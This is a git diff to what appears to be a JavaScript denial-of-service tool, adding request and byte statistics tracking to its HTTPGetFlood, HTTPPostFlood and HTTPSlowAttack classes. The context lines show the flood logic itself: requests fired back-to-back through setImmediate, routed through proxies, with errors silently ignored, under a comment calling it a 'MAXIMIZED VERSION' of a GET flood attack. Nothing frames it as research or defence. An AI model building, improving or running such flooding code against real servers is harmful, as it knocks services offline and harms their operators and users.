@@ -4,6 +4,7 @@ import { URL } from 'url';
 import { Tools } from '../../utils/tools.js';
 import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
 import { logger } from '../../utils/logger.js';
+import { StatsTracker } from '../../utils/stats-tracker.js';
 
 /**
  * HTTP/1.1 GET Flood Attack - MAXIMIZED VERSION
@@ -19,6 +20,10 @@ export class HTTPGetFlood {
         this.referers = referers;
         this.proxies = proxies;
         this.active = true;
+        
+        // Stats tracking for monitor
+        this.statsTracker = new StatsTracker();
+        this.stats = this.statsTracker.stats;
     }
 
     async start() {
@@ -91,17 +96,28 @@ export class HTTPGetFlood {
 
                         const protocol = this.url.protocol === 'https:' ? https : http;
                         
+                        const headerSize = JSON.stringify(options.headers).length;
+                        
                         const req = protocol.request(options, (res) => {
                             REQUESTS_SENT.add(1);
-                            res.on('data', () => {});
+                            this.statsTracker.addRequest(true, headerSize);
+                            
+                            res.on('data', (chunk) => {
+                                this.statsTracker.addBytes(chunk.length);
+                            });
                             res.on('end', () => {});
                         });
 
-                        req.on('error', () => {});
-                        req.on('timeout', () => req.destroy());
+                        req.on('error', () => {
+                            this.statsTracker.addRequest(false, headerSize);
+                        });
+                        req.on('timeout', () => {
+                            req.destroy();
+                            this.statsTracker.addRequest(false, headerSize);
+                        });
 
                         req.end();
-                        BYTES_SENT.add(JSON.stringify(options.headers).length);
+                        BYTES_SENT.add(headerSize);
                         completed++;
                         
                         // Fire next request immediately
@@ -177,20 +193,30 @@ export class HTTPPostFlood extends HTTPGetFlood {
                         };
 
                         const protocol = this.url.protocol === 'https:' ? https : http;
+                        const totalSize = Buffer.byteLength(payload) + JSON.stringify(options.headers).length;
                         
                         const req = protocol.request(options, (res) => {
                             REQUESTS_SENT.add(1);
-                            res.on('data', () => {});
+                            this.statsTracker.addRequest(true, totalSize);
+                            
+                            res.on('data', (chunk) => {
+                                this.statsTracker.addBytes(chunk.length);
+                            });
                             res.on('end', () => {});
                         });
 
-                        req.on('error', () => {});
-                        req.on('timeout', () => req.destroy());
+                        req.on('error', () => {
+                            this.statsTracker.addRequest(false, totalSize);
+                        });
+                        req.on('timeout', () => {
+                            req.destroy();
+                            this.statsTracker.addRequest(false, totalSize);
+                        });
 
                         req.write(payload);
                         req.end();
                         
-                        BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(options.headers).length);
+                        BYTES_SENT.add(totalSize);
                         completed++;
                         
                         setImmediate(makeRequest);
@@ -221,6 +247,10 @@ export class HTTPSlowAttack {
         this.proxies = proxies;
         this.active = true;
         this.connections = [];
+        
+        // Stats tracking for monitor
+        this.statsTracker = new StatsTracker();
+        this.stats = this.statsTracker.stats;
     }
 
     async start() {
